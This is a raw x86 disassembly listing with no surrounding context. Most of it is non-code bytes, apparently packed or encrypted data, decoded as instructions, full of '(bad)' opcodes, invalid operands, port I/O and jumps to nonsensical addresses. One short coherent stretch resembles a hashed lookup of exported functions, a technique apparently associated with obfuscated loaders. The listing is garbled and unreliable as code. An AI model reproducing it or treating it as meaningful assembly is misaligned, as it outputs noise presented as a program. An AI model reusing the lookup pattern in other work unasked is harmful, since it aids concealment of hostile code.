  4148cc:	or     DWORD PTR [esi+0x69],esp
  4148cf:	aam    0x99
  4148d1:	clc    
  4148d2:	mov    ebx,0xd21476e0
  4148d7:	or     BYTE PTR [eax+eax*2],al
  4148da:	mov    cl,0x57
  4148dc:	jmp    0x414940
  4148de:	test   DWORD PTR [ecx+ebx*1],ebp
  4148e1:	and    BYTE PTR [ecx+esi*8-0x2c26101a],0x1d
  4148e9:	lods   al,BYTE PTR ds:[esi]
  4148ea:	sub    esi,DWORD PTR [edi+0x7a]
  4148ed:	push   edi
  4148ee:	fcmovu st,st(4)
  4148f0:	fmul   QWORD PTR [eax]
  4148f2:	jne    0x4148c4
  4148f4:	mov    ds:0x61ecc96f,al
  4148f9:	or     BYTE PTR [edx],dh
  4148fb:	sub    al,0x2c
  4148fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148fe:	in     al,dx
  4148ff:	pop    ebx
  414900:	ss popf 
  414902:	mov    dl,0x29
  414904:	mov    al,0xe5
  414906:	lahf   
  414907:	ins    BYTE PTR es:[edi],dx
  414908:	fbstp  TBYTE PTR [esi+0x2bfcf83c]
  41490e:	stos   BYTE PTR es:[edi],al
  41490f:	mov    fs,WORD PTR [eax+0x4d]
  414912:	or     BYTE PTR [ebx+0x2ddb30e6],bl
  414918:	fs out 0xfd,al
  41491b:	out    dx,al
  41491c:	sub    eax,esi
  41491e:	mulps  xmm0,XMMWORD PTR [edx+eiz*4+0xc]
  414923:	cmp    ch,ch
  414925:	mov    edi,0x59cb0620
  41492a:	add    DWORD PTR [ecx+0x1e01c23a],0x2bafac35
  414934:	mov    esp,0x2fe7a29a
  414939:	sub    eax,0xd6c670b1
  41493e:	daa    
  41493f:	add    eax,esi
  414941:	pop    edx
  414942:	inc    edi
  414943:	cmp    BYTE PTR [edi+0x5de596ef],bh
  414949:	mov    ds:0x28b6fdd8,eax
  41494e:	aad    0x67
  414950:	dec    eax
  414951:	imul   cl
  414953:	xor    eax,0xef2096e
  414958:	inc    ecx
  414959:	ss mov edi,0xc5561db3
  41495f:	int3   
  414960:	push   edx
  414961:	jmp    0x414911
  414963:	adc    DWORD PTR [eax],0xbd220d89
  414969:	jp     0x41499a
  41496b:	add    edx,esp
  41496d:	rcr    al,0xac
  414970:	stc    
  414971:	pop    ecx
  414972:	add    eax,DWORD PTR [esi]
  414974:	ficom  WORD PTR [edi]
  414976:	inc    ebp
  414977:	jb     0x4149cc
  414979:	or     edx,esp
  41497b:	cmp    eax,0x7cd5385
  414980:	jne    0x414928
  414982:	shl    BYTE PTR [eax],1
  414984:	add    eax,0x5cb94d21
  414989:	mov    ebp,0x7f49a7e
  41498e:	xchg   BYTE PTR [edi+0x1e999768],bl
  414994:	aam    0x90
  414996:	aad    0x24
  414998:	sbb    al,0x78
  41499a:	adc    edi,DWORD PTR [eax-0x421ebe3b]
  4149a0:	jmp    0xf99581ce
  4149a5:	aam    0x64
  4149a7:	push   esi
  4149a8:	inc    ebx
  4149a9:	jne    0x414997
  4149ab:	mov    ch,0x7c
  4149ad:	mov    DWORD PTR [ecx-0x45],edx
  4149b0:	lea    ebx,[esi+0x37]
  4149b3:	pop    esp
  4149b4:	ret    
  4149b5:	cdq    
  4149b6:	mov    ebx,0xdeb79370
  4149bb:	sbb    esp,0x34
  4149be:	mov    ah,0xe3
  4149c0:	(bad)  
  4149c1:	dec    esp
  4149c2:	inc    esp
  4149c3:	idiv   BYTE PTR ds:0x73c52550
  4149c9:	jno    0x41495b
  4149cb:	std    
  4149cc:	jbe    0x4149f9
  4149ce:	sub    ah,BYTE PTR [esi+eax*2]
  4149d1:	pop    ebp
  4149d2:	aaa    
  4149d3:	ins    DWORD PTR es:[edi],dx
  4149d4:	es cmp al,0xb2
  4149d7:	add    eax,0x92054f1e
  4149dc:	sub    BYTE PTR gs:[ecx-0x50],cl
  4149e0:	sbb    al,0x1a
  4149e2:	push   esi
  4149e3:	mov    al,ds:0x5fa5f2d2
  4149e8:	ret    
  4149e9:	cwde   
  4149ea:	retf   0x25c3
  4149ed:	inc    esp
  4149ee:	loop   0x4149eb
  4149f0:	pushf  
  4149f1:	aad    0xa5
  4149f3:	mov    dl,BYTE PTR [ebp+edx*8-0x2afc75d4]
  4149fa:	test   al,0xb4
  4149fc:	and    BYTE PTR [ebx+0xa3cf325],bl
  414a02:	out    dx,eax
  414a03:	(bad)  
  414a04:	xor    ecx,DWORD PTR [eax+0x3723353a]
  414a0a:	add    al,0x6e
  414a0c:	xchg   BYTE PTR [esi],ah
  414a0e:	arpl   WORD PTR [edx-0x17],di
  414a11:	bound  esi,QWORD PTR [edi]
  414a13:	sti    
  414a14:	repnz shl DWORD PTR [edi+0x1a930da],0xbc
  414a1c:	test   dh,ah
  414a1e:	mov    eax,es:0x359cc9b6
  414a24:	inc    eax
  414a25:	sbb    edx,DWORD PTR [ebx]
  414a27:	pop    edx
  414a28:	add    BYTE PTR [ecx+0x2b],bh
  414a2b:	lds    esi,FWORD PTR [ebp+0x11b7cd81]
  414a31:	xchg   esp,eax
  414a32:	(bad)  
  414a33:	jnp    0x414a09
  414a35:	jns    0x4149f6
  414a37:	push   cs
  414a38:	push   ebp
  414a39:	adc    DWORD PTR [ecx-0x48],ebp
  414a3c:	xchg   ebx,eax
  414a3d:	ret    0x7bf0
  414a40:	test   eax,0x5a61e566
  414a45:	jmp    0x414a38
  414a47:	mov    al,0xc5
  414a49:	fnstsw WORD PTR [ecx+ecx*2+0x64]
  414a4d:	lahf   
  414a4e:	mov    ebp,0x5a0e3e12
  414a53:	loopne 0x4149f7
  414a55:	adc    eax,DWORD PTR [eax-0x36]
  414a58:	bound  edi,QWORD PTR [ebx]
  414a5a:	cmp    eax,DWORD PTR [ecx]
  414a5c:	(bad)  
  414a5d:	fcom   QWORD PTR [esi+0x74]
  414a60:	scas   eax,DWORD PTR es:[edi]
  414a61:	or     esi,DWORD PTR [ecx-0xc]
  414a64:	nop
  414a65:	dec    esi
  414a66:	enter  0x54b6,0x85
  414a6a:	pop    edx
  414a6b:	inc    esp
  414a6c:	xor    al,0x12
  414a6e:	(bad)  
  414a6f:	lds    ebp,FWORD PTR [ecx+0x45f66018]
  414a75:	cmp    DWORD PTR [edi],ebp
  414a77:	sub    dl,dl
  414a79:	dec    ebp
  414a7a:	cwde   
  414a7b:	out    dx,eax
  414a7c:	imul   ebx,DWORD PTR [ebx],0x532dbfac
  414a82:	xchg   esp,eax
  414a83:	scas   al,BYTE PTR es:[edi]
  414a84:	jecxz  0x414a28
  414a86:	call   0xc94abcfe
  414a8b:	ja     0x414ab7
  414a8d:	ds out dx,al
  414a8f:	cmp    BYTE PTR [ecx+0x6dd0f882],cl
  414a95:	fdiv   QWORD PTR [ecx]
  414a97:	adc    bh,BYTE PTR [ecx+0x6d96ca64]
  414a9d:	xchg   esi,eax
  414a9e:	pop    ebp
  414a9f:	mov    DWORD PTR [edx-0x47],esp
  414aa2:	xor    esp,esp
  414aa4:	outs   dx,DWORD PTR ds:[esi]
  414aa5:	pop    edx
  414aa6:	sbb    edi,DWORD PTR ds:0xd47c4ce9
  414aac:	cmp    bl,BYTE PTR [edx-0x35e8b75b]
  414ab2:	pop    esp
  414ab3:	adc    dh,dl
  414ab5:	dec    esp
  414ab6:	jo     0x414a7b
  414ab8:	int3   
  414ab9:	daa    
  414aba:	stc    
  414abb:	sub    BYTE PTR [eax],0x78
  414abe:	mov    edi,0x6cf77d92
  414ac3:	pop    edx
  414ac4:	sub    DWORD PTR [eax+0x45],0x99750ab4
  414acb:	jnp    0x414a54
  414acd:	ins    BYTE PTR es:[edi],dx
  414ace:	mov    eax,ds:0xab1c6bf4
  414ad3:	or     BYTE PTR [eax-0x4e],bl
  414ad6:	push   cs
  414ad7:	js     0x414a6b
  414ad9:	push   ss
  414ada:	shl    BYTE PTR [edx],cl
  414adc:	push   edi
  414add:	and    ebp,esi
  414adf:	loop   0x414b4b
  414ae1:	sbb    edx,ecx
  414ae3:	dec    esi
  414ae4:	fld    TBYTE PTR [esi+0x477d8758]
  414aea:	loopne 0x414ae1
  414aec:	(bad)  
  414aed:	fucompp 
  414aef:	mov    ebx,0x84294aeb
  414af4:	arpl   WORD PTR [edx+0x74],si
  414af7:	fadd   DWORD PTR [ebx]
  414af9:	inc    esp
  414afa:	mov    WORD PTR [edi-0x4527217f],fs
  414b00:	out    0x91,al
  414b02:	push   0xffffffc6
  414b04:	sub    DWORD PTR [esi+ebp*1+0xa],ebp
  414b08:	fucom  st(5)
  414b0a:	mov    eax,ds:0xc9e71bcd
  414b0f:	test   BYTE PTR [edi],bl
  414b11:	jg     0x414b7f
  414b13:	mov    ds:0x18e919f3,eax
  414b18:	sub    DWORD PTR [ebx+0x4e],edx
  414b1b:	add    DWORD PTR [esi],ebp
  414b1d:	stos   DWORD PTR es:[edi],eax
  414b1e:	shr    BYTE PTR [eax+0x7ce87f7b],0xa2
  414b25:	stos   DWORD PTR es:[edi],eax
  414b26:	repz (bad) 
  414b28:	and    eax,ecx
  414b2a:	xor    al,0x51
  414b2c:	ja     0x414b25
  414b2e:	dec    eax
  414b2f:	jg     0x414b55
  414b31:	push   ecx
  414b32:	dec    edi
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bb7:	fs cmp eax,0x7f7b5b2f
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414b99
  414bc3:	jl     0x414bf3
  414bc5:	test   BYTE PTR [ebp+edi*4-0x3c],bl
  414bc9:	std    
  414bca:	jmp    0xea89:0xe9400e0f
  414bd1:	push   ebp
  414bd2:	lods   eax,DWORD PTR ds:[esi]
  414bd3:	es stos BYTE PTR es:[edi],al
  414bd5:	pop    esi
  414bd6:	inc    edi
  414bd7:	adc    al,0xfc
  414bd9:	imul   edx,DWORD PTR [esi-0x30],0x2bb15ca4
  414be0:	and    al,0xfa
  414be2:	xor    DWORD PTR [esi-0x6a],ebp
  414be5:	push   0xc9ece95b
  414bea:	ss mov al,0x6f
  414bed:	jmp    0x414b87
  414bef:	pop    esi
  414bf0:	fld    QWORD PTR [eax+0x45b4dcab]
  414bf6:	mov    bh,0x71
  414bf8:	mov    bh,0x98
  414bfa:	data16 stos BYTE PTR es:[edi],al
  414bfc:	xchg   edi,eax
  414bfd:	xor    dl,BYTE PTR [edx+eiz*8]
  414c00:	shl    BYTE PTR [ecx+0x48],0x89
  414c04:	cmp    DWORD PTR [edi+0x8194378],ebp
  414c0a:	or     ah,BYTE PTR [ebp-0xd]
  414c0d:	push   ecx
  414c0e:	ret    0x8bbf
  414c11:	mov    esp,DWORD PTR [eax-0x62e47941]
  414c17:	test   BYTE PTR [eax-0xd5d9ee6],dh
  414c1d:	mov    BYTE PTR [eax+0x4b18d160],ch
  414c23:	nop
  414c24:	enter  0x34d3,0x11
  414c28:	out    0x5a,al
  414c2a:	mov    dh,0x65
  414c2c:	sub    dl,BYTE PTR [esi]
  414c2e:	inc    ecx
  414c2f:	lds    ebx,FWORD PTR ds:0xa4863e3d
  414c35:	xchg   esp,eax
  414c36:	icebp  
  414c37:	jmp    0x5b098e
  414c3c:	cmp    bp,cx
  414c3f:	mov    WORD PTR [ecx],?
  414c41:	mov    al,al
  414c43:	popa   
  414c44:	rcr    esi,1
  414c46:	ja     0x414c65
  414c48:	outs   dx,BYTE PTR ds:[esi]
  414c49:	mov    BYTE PTR [esi-0x7ccf6cc0],ch
  414c4f:	xor    al,0xb0
  414c51:	pop    eax
  414c52:	xchg   edx,eax
  414c53:	inc    eax
  414c54:	jmp    0x99e0:0xae1838a5
  414c5b:	mov    cl,0x16
  414c5d:	push   cs
  414c5e:	jo     0x414bfc
  414c60:	sub    al,0x40
  414c62:	aaa    
  414c63:	(bad)  
  414c64:	fs xor eax,0x2a5585be
  414c6a:	adc    al,0xa4
  414c6c:	dec    esi
  414c6d:	jg     0x414c74
  414c6f:	and    eax,0x9ebf068
  414c74:	(bad)  
  414c76:	ror    BYTE PTR [edx],0x7f
  414c79:	cmp    bh,BYTE PTR [ebp+0x45]
  414c7c:	fwait
  414c7d:	loopne 0x414c6d
  414c7f:	xchg   edx,eax
  414c80:	ds iret 
  414c82:	mov    DWORD PTR [edi+eax*2+0xc3709a1],ebx
  414c89:	bound  eax,QWORD PTR [edi+0x3d]
  414c8c:	mov    dh,0x6e
  414c8e:	sub    al,0x3f
  414c90:	sahf   
  414c91:	lds    ecx,FWORD PTR fs:[ebx]
  414c94:	fisttp WORD PTR [ebp+0x76]
  414c97:	xchg   edi,eax
  414c98:	(bad)  
  414c99:	out    dx,al
  414c9a:	test   DWORD PTR [ebx+0x7cb973ea],eax
  414ca0:	outs   dx,BYTE PTR ds:[esi]
  414ca1:	fs inc eax
  414ca3:	call   0xc92cb803
  414ca8:	adc    eax,0xb8a68485
  414cad:	stc    
  414cae:	lods   al,BYTE PTR ds:[esi]
  414caf:	sbb    BYTE PTR [ebx+0x5150cc10],cl
  414cb5:	jno    0x414c85
  414cb7:	pop    es
  414cb8:	pop    ebp
  414cb9:	les    ebp,FWORD PTR [ecx-0x29f0495d]
  414cbf:	mov    esi,0x6477a1dd
  414cc4:	mov    bl,0x24
  414cc6:	rcr    BYTE PTR [edi+0x7ce43d4],0xa
  414ccd:	add    ebx,edx
  414ccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd0:	nop
  414cd1:	(bad)  
  414cd2:	xlat   BYTE PTR ds:[ebx]
  414cd3:	(bad)  
  414cd4:	or     BYTE PTR [bp+0x7f],ah
  414cd8:	push   ecx
  414cd9:	xor    DWORD PTR [esi],eax
  414cdb:	mov    ecx,0x344c9441
  414ce0:	inc    edx
  414ce1:	mov    eax,ds:0x1de03d5c
  414ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ce7:	push   dx
  414ce9:	mov    esp,0x43a39505
  414cee:	sub    edi,esi
  414cf0:	pop    ds
  414cf1:	mov    al,ds:0xcdc97840
  414cf6:	xchg   DWORD PTR [edx+0x52],eax
  414cf9:	cwde   
  414cfa:	fild   DWORD PTR [esp+esi*2-0x70]
  414cfe:	scas   eax,DWORD PTR es:[edi]
  414cff:	scas   eax,DWORD PTR es:[edi]
  414d00:	movq   mm2,mm0
  414d03:	out    0x49,al
  414d05:	sbb    ah,al
  414d07:	scas   al,BYTE PTR es:[edi]
  414d08:	pop    esp
  414d09:	push   ebx
  414d0a:	and    al,BYTE PTR ds:[ebp+0x3cfe2c3]
  414d11:	and    cl,BYTE PTR [esi+0x4c99e35]
  414d17:	stc    
  414d18:	pop    edi
  414d19:	stc    
  414d1a:	in     eax,0x79
  414d1c:	popf   
  414d1d:	ja     0x414d78
  414d1f:	xchg   BYTE PTR [ebp+0x5f],dh
  414d22:	and    al,0x5d
  414d24:	jle    0x414d86
  414d26:	mov    al,0xb0
  414d28:	and    eax,0x774300d2
  414d2d:	aad    0x3b
  414d2f:	sub    al,0x6b
  414d31:	lock adc al,0x38
  414d34:	sub    DWORD PTR [edx-0x54],ecx
  414d37:	mov    ch,0xcb
  414d39:	and    dl,BYTE PTR [edi+ebx*8-0x16]
  414d3d:	xchg   edi,eax
  414d3e:	call   0x4923d6c2
  414d43:	imul   ebx,edx,0xfffffff9
  414d46:	sbb    ebx,DWORD PTR [edi]
  414d48:	jl     0x414d49
  414d4a:	xor    al,0x7d
  414d4c:	(bad)  
  414d4e:	nop
  414d4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d50:	inc    esp
  414d51:	mov    eax,ds:0xdcbbdb32
  414d56:	sub    esi,eax
  414d58:	add    al,BYTE PTR [esi+0x600f4aa0]
  414d5e:	mov    eax,0x463380eb
  414d63:	js     0x414d09
  414d65:	retf   0x8571
  414d68:	fst    QWORD PTR [esi]
  414d6a:	aaa    
  414d6b:	cmp    dh,0x78
  414d6e:	cdq    
  414d6f:	clc    
  414d70:	es gs push es
  414d73:	call   0x4ba25bb0
  414d78:	shl    edi,1
  414d7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d7b:	adc    ah,BYTE PTR [edi+edx*2+0x7e4c7640]
  414d82:	stos   BYTE PTR es:[edi],al
  414d83:	data16 mov al,ds:0xd3302e08
  414d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d8a:	popf   
  414d8b:	mov    WORD PTR [edi+ebp*2+0x1c8fbdc7],es
  414d92:	mov    bl,BYTE PTR [edi+esi*8+0x79]
  414d96:	imul   ebx,DWORD PTR [esi+eax*4+0x6e],0x64
  414d9b:	pop    es
  414d9c:	int3   
  414d9d:	or     esp,DWORD PTR [ebp+eax*8+0x4ece019]
  414da4:	(bad)  
  414da5:	stos   DWORD PTR es:[edi],eax
  414da6:	or     BYTE PTR [edi+0x676026fc],dh
  414dac:	call   0xa71944aa
  414db1:	dec    edi
  414db2:	ins    BYTE PTR es:[edi],dx
  414db3:	add    BYTE PTR [ecx+0x77e00600],0x1
  414dba:	xchg   edx,eax
  414dbb:	ins    BYTE PTR es:[edi],dx
  414dbc:	sbb    BYTE PTR [ecx],0xbb
  414dbf:	pop    ds
  414dc0:	pop    es
  414dc1:	jle    0x414df8
  414dc3:	mov    edx,0xd496107d
  414dc8:	sbb    al,0xf
  414dca:	jmp    0x7ef6:0x6df75e10
  414dd1:	and    ecx,DWORD PTR [edi*2+0x47f5aa43]
  414dd8:	mov    ebx,0x4b80a4a6
  414ddd:	ds xchg edi,eax
  414ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414de0:	xor    edx,DWORD PTR [ebp+eax*2-0x66208ac9]
  414de7:	pushf  
  414de8:	mov    ds:0xc3a02666,al
  414ded:	idiv   BYTE PTR [eax-0x67]
  414df0:	test   eax,0x7cfe9f5
  414df5:	fcmovnu st,st(4)
  414df7:	(bad)
  414dfb:	mov    esi,0xeedf8952
  414e00:	pop    ss
  414e01:	mov    al,ds:0x61d31f04
  414e06:	test   eax,0x645b849a
  414e0b:	dec    DWORD PTR gs:[ecx+eiz*8+0x5f]
  414e10:	mov    esp,ecx
  414e12:	and    eax,0x14acfa2c
  414e17:	jb     0x414e02
  414e19:	inc    esi
  414e1a:	dec    ecx
  414e1b:	sti    
  414e1c:	(bad)  
  414e1d:	bound  edi,QWORD PTR [edx+0x1bb01248]
  414e23:	ret    
  414e24:	inc    ebx
  414e25:	(bad)  
  414e28:	adc    ebp,DWORD PTR [esi+0x578ead57]
  414e2e:	dec    ecx
  414e2f:	not    edi
  414e31:	adc    esi,DWORD PTR [edx+0x308d5bdc]
  414e37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e38:	mov    ecx,0xf371b6b6
  414e3d:	outs   dx,DWORD PTR ds:[esi]
  414e3e:	add    edi,0x6f
  414e41:	test   DWORD PTR [edi+edi*8-0x12],edx
  414e45:	(bad)  
  414e46:	cmp    eax,0x97b1d5b2
  414e4b:	jno    0x414e7d
  414e4d:	sahf   
  414e4e:	adc    DWORD PTR [ebp+0x2a659c0c],esp
  414e54:	xchg   BYTE PTR [ebp+0x30],cl
  414e57:	dec    edx
  414e58:	push   es
  414e59:	ja     0x414e1f
  414e5b:	push   ebx
  414e5c:	pop    ebx
  414e5d:	xchg   esi,eax
  414e5e:	xchg   ecx,eax
  414e5f:	push   ss
  414e60:	add    ch,BYTE PTR [esi+0x1c]
  414e63:	mov    ebx,0x18065e21
  414e68:	cmp    ah,ah
  414e6a:	mov    ebx,0x89b699f9
  414e6f:	mov    bh,0xab
  414e71:	jo     0x414e2c
  414e73:	cmc    
  414e74:	gs (bad) 
  414e76:	and    BYTE PTR [esi-0x3d223185],0x3
  414e7d:	les    ecx,FWORD PTR [eax-0x15]
  414e80:	pop    ebp
  414e81:	cmp    dh,bh
  414e83:	add    BYTE PTR [edx-0x67276773],0x59
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	(bad)  
  414eae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eaf:	sbb    al,0xa4
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414e89
  414eb9:	inc    edx
  414eba:	xchg   ebx,eax
  414ebb:	mov    esi,0xe0295b37
  414ec0:	pop    eax
  414ec1:	jno    0x414e8f
  414ec3:	push   es
  414ec4:	enter  0x7d8a,0x17
  414ec8:	les    ebp,FWORD PTR [eax-0x7c]
  414ecb:	out    0x40,eax
  414ecd:	ins    DWORD PTR es:[edi],dx
  414ece:	aaa    
  414ecf:	jns    0x414f0d
  414ed1:	out    0x89,eax
  414ed3:	mov    edi,0x1ea05edb
  414ed8:	push   eax
  414ed9:	ret    
  414eda:	das    
  414edb:	sub    BYTE PTR [edi],al
  414edd:	sub    eax,0x21ee1ec2
  414ee2:	int    0xf7
  414ee4:	pop    ss
  414ee5:	dec    ecx
  414ee6:	cmp    eax,0x1dc3fe07
  414eeb:	inc    edx
  414eec:	mov    eax,0xe279579a
  414ef1:	ja     0x414f0e
  414ef3:	imul   edx,DWORD PTR [ebx+0x7b],0xf736031a
  414efa:	enter  0x2196,0x29
  414efe:	(bad)  
  414f00:	imul   edi,DWORD PTR [eax+0x504db3b1],0xf90969f7
  414f0a:	mov    ebp,0xb9f0ea14
  414f0f:	fnstcw WORD PTR [esi+0x693aedfa]
  414f15:	mov    ebp,0x5db8a372
  414f1a:	push   cs
  414f1b:	jns    0x414f11
  414f1d:	or     edi,DWORD PTR [esi+0x22]
  414f20:	sub    esi,ecx
  414f22:	jg     0x414f38
  414f24:	pop    esp
  414f25:	or     ebx,DWORD PTR [ecx+eax*2-0x7e]
  414f29:	mov    ds:0xc9f41558,eax
  414f2e:	jnp    0x414f5c
  414f30:	fwait
  414f31:	cmc    
  414f32:	pop    esi
  414f33:	push   0x4d
  414f35:	inc    eax
  414f36:	cmp    edi,DWORD PTR [ecx]
  414f38:	jbe    0x414fae
  414f3a:	add    BYTE PTR [edi],ah
  414f3c:	stc    
  414f3d:	jle    0x414f73
  414f3f:	loope  0x414f1e
  414f41:	mov    ebx,0x220f083b
  414f46:	inc    ebx
  414f47:	sti    
  414f48:	loopne 0x414f5f
  414f4a:	cmp    DWORD PTR [ecx+edx*4],0x14
  414f4e:	jmp    0x414f96
  414f50:	retf   0xc69a
  414f53:	sub    DWORD PTR [ecx],esi
  414f55:	ins    DWORD PTR es:[edi],dx
  414f56:	push   ss
  414f57:	cld    
  414f58:	in     al,dx
  414f59:	dec    ebx
  414f5a:	or     BYTE PTR [edi+0x25],bl
  414f5d:	sub    esi,DWORD PTR [esi-0x2a4cd2ba]
  414f63:	call   0xcbb03256
  414f68:	dec    esp
  414f69:	or     ch,BYTE PTR [esi-0x6ac00283]
  414f6f:	push   esi
  414f70:	test   al,0x8
  414f72:	(bad)  
  414f73:	sub    BYTE PTR [edx+edi*1+0x435bf8d0],al
  414f7a:	mov    bl,BYTE PTR [esi+0x59a86e1e]
  414f80:	lods   al,BYTE PTR ds:[esi]
  414f81:	and    al,0x4
  414f83:	scas   eax,DWORD PTR es:[edi]
  414f84:	jl     0x414f3a
  414f86:	lods   eax,DWORD PTR ds:[esi]
  414f87:	fnsave [esi+0x4fd3bd4c]
  414f8d:	or     eax,0xfbc3d033
  414f92:	push   edx
  414f93:	jb     0x414ff3
  414f95:	mov    ebp,0x286e3549
  414f9a:	sbb    DWORD PTR [eax-0x3ee591c7],esi
  414fa0:	pushf  
  414fa1:	stos   BYTE PTR es:[edi],al
  414fa2:	aaa    
  414fa3:	mov    edi,0x3de00811
  414fa8:	push   0x0
  414faa:	add    ecx,0xa3ba06d7
  414fb0:	lea    ebp,[ecx-0x78]
  414fb3:	inc    DWORD PTR [ebp-0x3d]
  414fb6:	mov    ah,BYTE PTR [ebx]
  414fb8:	mov    esp,0xa5b48ab9
  414fbd:	push   esp
  414fbe:	les    esi,FWORD PTR [eax]
  414fc0:	add    al,0xc5
  414fc2:	dec    esi
  414fc3:	in     al,dx
  414fc4:	rcl    BYTE PTR [edx+eiz*1+0x5e3f4c13],1
  414fcb:	xlat   BYTE PTR ds:[ebx]
  414fcc:	sar    ebx,cl
  414fce:	inc    edx
  414fcf:	or     DWORD PTR ds:[ebp+0x2c505010],eax
  414fd6:	cmp    ebx,ebp
  414fd8:	sar    DWORD PTR [ebp-0x7d02ed2],cl
  414fde:	inc    DWORD PTR [edi+0x53]
  414fe1:	je     0x414fc9
  414fe3:	mov    bh,0x8b
  414fe5:	push   ecx
  414fe7:	add    esi,DWORD PTR [edi-0x3022e1ce]
  414fed:	in     eax,0xa2
  414fef:	or     ecx,DWORD PTR [esi-0x35]
  414ff2:	cmc    
  414ff3:	js     0x41502e
  414ff5:	es sub eax,0x7b74d1e2
  414ffb:	addr16 ret 0x5ab9
  414fff:	out    dx,eax
  415000:	and    al,0xcd
  415002:	dec    edi
  415003:	xor    DWORD PTR [ecx+0xc],ebp
  415006:	or     eax,0x9351570e
  41500b:	fnstenv [ebp+eiz*4+0xb1e2649]
  415012:	jmp    0x415035
  415014:	xchg   DWORD PTR [esi-0x4353a151],esi
  41501a:	cs inc ebp
  41501c:	jno    0x414fde
  41501e:	test   DWORD PTR [ebp+0x21],0x2ff48e56
  415025:	push   ebp
  415026:	in     eax,0x88
  415028:	fldenv [ecx-0x36893f41]
  41502e:	add    DWORD PTR [ebx+ecx*2-0x8],edx
  415032:	push   edi
  415033:	add    DWORD PTR [ebp+0x6b],ebx
  415036:	jns    0x415091
  415038:	sbb    al,0xc8
  41503a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41503b:	inc    ecx
  41503c:	mov    ah,0x7f
  41503e:	sub    edx,eax
  415040:	adc    ebx,DWORD PTR [esi+0x4fd12b66]
  415046:	jae    0x415096
  415048:	ficom  WORD PTR [ecx+0x30e4e6a3]
  41504e:	cs ja  0x4150a9
  415051:	hlt    
  415052:	call   0x7369:0xe71cad62
  415059:	nop
  41505a:	cli    
  41505b:	xchg   edi,eax
  41505c:	jmp    0xe0e6927
  415061:	jo     0x41507d
  415063:	mov    bl,0xce
  415065:	int3   
  415066:	mov    ds:0x6092156b,eax
  41506b:	and    ebx,DWORD PTR [eax-0x4f]
  41506e:	and    ch,BYTE PTR [esi-0x60]
  415071:	sub    edi,DWORD PTR [edx-0x467dd683]
  415077:	jle    0x4150a4
  415079:	and    al,0xc6
  41507b:	loop   0x41509b
  41507d:	in     eax,0x54
  41507f:	mov    ds:0x4ac7d326,al
  415084:	pop    eax
  415085:	sbb    al,0xbc
  415087:	test   ebx,edi
  415089:	mov    eax,ds:0xc73d8942
  41508e:	mov    ds:0x899fcd98,eax
  415093:	ds (bad) 
  415095:	fldcw  WORD PTR [esp+ebx*1]
  415098:	imul   edi,DWORD PTR [eax+eax*4],0xffffff95
  41509c:	loope  0x4150e8
  41509e:	fwait
  41509f:	adc    DWORD PTR es:[ebx+0x30],ebp
  4150a3:	lods   eax,DWORD PTR ds:[esi]
  4150a4:	jbe    0x4150d8
  4150a6:	fadd   DWORD PTR [edi+0xdcd51ee]
  4150ac:	adc    ecx,ebp
  4150ae:	jo     0x41504c
  4150b0:	cdq    
  4150b1:	push   ss
  4150b2:	dec    ebx
  4150b3:	pusha  
  4150b4:	fcom   QWORD PTR [edx]
  4150b6:	sti    
  4150b7:	add    eax,0x86df83d1
  4150bc:	fimul  WORD PTR [eax+0x3c]
  4150bf:	mov    dh,0xee
  4150c1:	xchg   edx,eax
  4150c2:	popa   
  4150c3:	or     eax,0x1dcbbc45
